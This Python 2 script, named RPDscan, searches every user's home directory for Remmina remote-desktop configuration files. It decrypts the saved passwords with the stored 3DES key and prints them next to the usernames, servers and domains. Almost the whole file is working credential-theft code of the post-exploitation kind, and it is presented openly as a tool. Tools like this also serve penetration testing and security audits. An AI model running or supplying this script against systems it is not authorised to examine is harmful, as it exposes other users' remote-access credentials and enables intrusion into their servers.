import base64
from Crypto.Cipher import DES3
import os
import subprocess
import re

#########################################################
# RPDscan - Remmina Password Decorder/scanner		#			
#	by Freakyclown					#
# This tool searches the /home directory for users      #
# Remmina preference and config files, then does some   #
# magic to decode any saved passwords it finds          #
#							#
#########################################################

# Changelog
# 0.1 alpha 3/april/2014

####  usage #####################################
#						#
# python RPDscan.py 				#
#						#
#################################################




def decodewithscience(private_key_line,saved_key_line):
	## grab the password and the secret key and truncate them on the first = ##
	private_key = private_key_line.split('=',1)
	saved_key = saved_key_line.split('=',1)
	
	## base 64 decode the private key and the saved password key
	decoded_private_key =  base64.decodestring(str(private_key[1]))
	decoded_saved_key = base64.decodestring(str(saved_key[1:]))
	
	## do some magic and decode and print out the decoded password \o/
	print "Saved password: "
	print DES3.new(decoded_private_key[:24],DES3.MODE_CBC,decoded_private_key[24:]).decrypt(decoded_saved_key)

def muchprefsverywow(pref_key):

	## open a process to find all the remmina configs ##
	sub_proc_confs = subprocess.Popen("find /home/ -type f -name *.remmina", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

        ## for each line do some magic
        for sub_conf_found in sub_proc_confs.stdout:
		print "========"
                with open(sub_conf_found.strip(), 'r') as found_pref:
		    print "Found a conf file:", sub_conf_found
                    for conf_secret in found_pref:
			if 'username=' in conf_secret:
				print conf_secret
			if 'server=' in conf_secret:
				print conf_secret
			if 'domain=' in conf_secret:
				print conf_secret
                        if 'password' in conf_secret:
                                if conf_secret == "password=\n":
                                        print "no saved password sorry!"
                                        print ""
                                else:
                                        decodewithscience(pref_key,conf_secret)
                                        print ""




def findalltheprefs():
	## open a new process and do the find ##
	sub_proc_pref = subprocess.Popen("find /home/ -name remmina.pref", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

	## iterate over all the found pref files ##
	for sub_pref_found in sub_proc_pref.stdout:
		
		## tell the user we found something ##
		print "found this pref file", sub_pref_found
		
		## open the pref file and check/grab the users private key
	        with open(sub_pref_found.strip(), 'r') as found_pref:
	            for pref_secret in found_pref:
	                if 'secret' in pref_secret:
				muchprefsverywow(pref_secret)


findalltheprefs()


